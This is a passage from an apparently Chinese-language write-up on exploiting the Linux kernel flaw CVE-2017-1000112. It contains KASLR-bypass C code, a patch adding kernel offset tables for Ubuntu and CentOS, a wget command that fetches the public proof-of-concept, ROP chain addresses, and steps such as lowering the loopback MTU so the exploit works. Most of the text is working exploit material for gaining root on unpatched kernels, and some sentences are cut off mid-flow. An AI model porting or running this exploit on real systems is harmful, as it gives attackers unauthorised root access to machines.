    { “xenial”, “4.4.0-81-generic”, 0xa2800, 0xa2bf0, 0x8a, 0x3eb4ad, 0x112697, 0x1b9c0, 0x40341a, 0x1de6c, 0x7a453, 0x125787, 0x64580, 0x49ed0 },
      unsigned long get_kernel_addr() {
        char* syslog;
        int size;
        mmap_syslog(&syslog, &size);
        if (strcmp("trusty", kernels[kernel].distro) == 0 &&
            strncmp("4.4.0", kernels[kernel].version, 5) == 0)
                return get_kernel_addr_trusty(syslog, size);
        if (strcmp("xenial", kernels[kernel].distro) == 0 &&
            (strncmp("4.4.0", kernels[kernel].version, 5) == 0) ||
            (strncmp("4.8.0", kernels[kernel].version, 5) == 0))
                return get_kernel_addr_xenial(syslog, size);
        printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");
        exit(EXIT_FAILURE);
    }
## 修复补丁
    4.4.0-81.patch
    `—- poc.c 2017-12-21 11:49:17.758164986 -0600
    +++ updated.c 2017-12-20 16:21:06.187852954 -0600
    @@ -117,6 +117,7 @@
    { “trusty”, “4.4.0-79-generic”, 0x9ebb0, 0x9ee90, 0x4518a, 0x3ebdcf, 0x1099a7, 0x1a830, 0x3e77ba, 0x1cc8c, 0x774e3, 0x49cdd, 0x62330, 0x1a78b },
    { “trusty”, “4.4.0-81-generic”, 0x9ebb0, 0x9ee90, 0x4518a, 0x2dc688, 0x1099a7, 0x1a830, 0x3e789a, 0x1cc8c, 0x774e3, 0x24487, 0x62330, 0x1a78b },
    { “trusty”, “4.4.0-83-generic”, 0x9ebc0, 0x9eea0, 0x451ca, 0x2dc6f5, 0x1099b7, 0x1a830, 0x3e78fa, 0x1cc8c, 0x77533, 0x49d1d, 0x62360, 0x1a78b },
    { “xenial”, “4.4.0-81-generic”, 0xa2800, 0xa2bf0, 0x8a, 0x3eb4ad, 0x112697, 0x1b9c0, 0x40341a, 0x1de6c, 0x7a453, 0x125787, 0x64580, 0x49ed0 },
    { “xenial”, “4.8.0-34-generic”, 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },
    { “xenial”, “4.8.0-36-generic”, 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },
    { “xenial”, “4.8.0-39-generic”, 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },
    @@ -326,7 +327,8 @@
    strncmp("4.4.0", kernels[kernel].version, 5) == 0)
        return get_kernel_addr_trusty(syslog, size);
    if (strcmp(“xenial”, kernels[kernel].distro) == 0 &&
    strncmp(“4.8.0”, kernels[kernel].version, 5) == 0)
    (strncmp(“4.4.0”, kernels[kernel].version, 5) == 0) ||
    (strncmp(“4.8.0”, kernels[kernel].version, 5) == 0))
    return get_kernel_addr_xenial(syslog, size);
    printf(“[-] KASLR bypass only tested on trusty 4.4.0- and xenial 4-8-0-“);`
## 部署修复补丁
    wget https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
    patch destructor_arg。在上述代码中，我们也可以看到skb的地址0xffff880039161400（针对skb_release_all的调用）：
在skb_release_data中，针对ROP链起始位置的间接引用开始于地址0xffffffff81720a12，ROP链开始于地址0xffffffff81720a1f。
最终我们得到了内存中的ROP链：
## Linux发行版
###  要求
在满足下列情况的条件下，任何非特权用户都可以利用该漏洞来实施攻击：
用户可以设置一个接口，开启UFO并设置MTU 
kernel-3.10.0-693.5.2.el7.x86_64.rpm
CentOS 6-
kernel-2.6.32-696.16.1.el6.x86_64.rpm
我已经在CentOS 7（kernel 3.10.0-693.el7.x86_64）上测试成功了，但是我们需要手动调低回环适配器的MTU：
/sbin/ifconfig lo mtu 1500
###  偏移量：
    { "cent7", "3.10.0-693.el7.x86_64", 0xb7670, 0xb7980, 0x8a, 0x39337a, 0x650ca, 0x19bf0, 0x32d41a, 0x11e843, 0x7c6b3, 0x4b8f7, 0x63210, 0x6bab33 }
## 参考资料